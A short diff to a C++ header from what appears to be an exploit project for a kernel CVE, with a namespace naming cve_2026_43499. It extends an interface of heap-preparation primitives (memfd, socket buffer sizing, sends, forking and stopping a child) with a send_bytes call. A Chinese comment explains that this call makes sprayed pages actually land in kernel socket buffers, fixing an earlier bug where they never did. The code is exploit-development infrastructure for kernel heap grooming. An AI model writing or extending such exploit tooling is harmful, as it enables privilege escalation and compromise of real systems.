@@ -34,7 +34,8 @@ namespace ghostlock::backend::cve_2026_43499::memory {
     /** Every call a preparation makes on the platform. */
     template <class Seam>
     concept HeapSeam = requires(std::int32_t fd, std::int32_t *pair, std::int32_t bytes,
-                                std::size_t count, std::uint64_t pid, std::int32_t cpu) {
+                                std::size_t count, std::uint64_t pid, std::int32_t cpu,
+                                const void *data) {
         { Seam::page_size() } -> std::same_as<SeamResult>;
         { Seam::open_memfd(pid) } -> std::same_as<SeamResult>;
         { Seam::close_fd(fd) } -> std::same_as<SeamResult>;
@@ -42,6 +43,9 @@ namespace ghostlock::backend::cve_2026_43499::memory {
         { Seam::set_socket_buffer(fd, bytes) } -> std::same_as<SeamResult>;
         { Seam::set_nonblocking(fd) } -> std::same_as<SeamResult>;
         { Seam::send_buffer(fd, count) } -> std::same_as<SeamResult>;
+        /* 带内容发送：页面必须走这条路进内核（退役的 sendmsg(skb_buf) ✓），
+         *  否则内核里的 skb 是零、页面等于没放（本树此前正是如此 ✗）。 */
+        { Seam::send_bytes(fd, data, count) } -> std::same_as<SeamResult>;
         { Seam::fork_child() } -> std::same_as<SeamResult>;
         { Seam::stop_child(pid) } -> std::same_as<SeamResult>;
         { Seam::yield_now() } -> std::same_as<SeamResult>;
